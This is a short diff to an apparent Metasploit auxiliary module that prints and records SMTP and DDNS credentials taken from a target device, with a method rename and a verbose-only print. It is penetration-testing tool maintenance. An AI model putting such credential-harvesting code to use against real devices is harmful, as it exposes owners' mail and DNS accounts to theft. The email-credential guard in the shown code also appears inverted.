@@ -120,7 +120,7 @@ class Metasploit3 < Msf::Auxiliary
     print_good("  SMTP User: #{data[5]}")
     print_good("  SMTP Password: #{data[6]}")
     return unless mailserver.blank? && mailport.blank? && muser.blank? && mpass.blank?
-    report_email_creds(mailserver, mailport, muser, mpass)
+    report_email_cred(mailserver, mailport, muser, mpass)
   end
 
   def grab_ddns
@@ -144,7 +144,9 @@ class Metasploit3 < Msf::Auxiliary
       ddns_pass = val[5]
       ddns_table << [ ddns_service, ddns_server, ddns_port, ddns_domain, ddns_user, ddns_pass ]
       unless ddns_server.blank? && ddns_port.blank? && ddns_user.blank? && ddns_pass.blank?
-        ddns_table.print
+        if datastore['VERBOSE']
+          ddns_table.print
+        end
         report_ddns_cred(ddns_server, ddns_port, ddns_user, ddns_pass)
       end
     end
